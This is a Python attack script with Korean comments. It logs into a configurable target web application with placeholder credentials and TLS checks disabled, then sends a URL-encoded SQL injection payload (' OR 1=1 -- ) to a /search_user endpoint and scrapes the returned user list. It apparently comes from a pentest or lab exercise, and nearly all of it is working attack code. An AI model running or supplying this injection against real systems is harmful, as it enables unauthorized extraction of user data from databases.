import requests
import urllib3
import sys
import os
import time
from bs4 import BeautifulSoup

# config 경로 설정
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from config import TARGET_URL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

login_url = f"{TARGET_URL}/login"
login_data = {
    "username": "test",   # 실제 계정 정보로 변경 필요
    "password": "test"
}

# POST로 로그인 시도
resp = session.post(login_url, data=login_data, verify=False, allow_redirects=False)
print(f"[+] POST {login_url} 응답 상태 코드: {resp.status_code}")

# 리다이렉션이 있으면 따라가기
if resp.is_redirect or resp.status_code in [301, 302, 303, 307, 308]:
    redirect_url = resp.headers.get("Location")
    print(f"[+] 리다이렉션 감지됨 → 이동 경로: {redirect_url}")
    if redirect_url.startswith("/"):
        redirect_url = TARGET_URL.rstrip("/") + redirect_url
    resp2 = session.get(redirect_url, verify=False)
    print(f"[+] 리다이렉션 응답 상태 코드: {resp2.status_code}")
    print(resp2.text)
else:
    print(resp.text)

# 3️⃣ SQLi 검색 요청
payload = "%27%20OR%201%3D1%20--%20"
search_url = f"{TARGET_URL}/search_user?q={payload}"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": f"{TARGET_URL}/search_user",
    "Upgrade-Insecure-Requests": "1"
}
time.sleep(1)  # 요청 간 간격
search_resp = session.get(search_url, headers=headers, verify=False)

# 4️⃣ 검색 결과 출력
soup = BeautifulSoup(search_resp.text, 'html.parser')
results = soup.find_all("li")

print("\n[+] 검색 결과 (SQLi)")
if results:
    for r in results:
        print(" [+]", r.text.strip())
else:
    print(" [-] 결과 없음 또는 필터링됨")
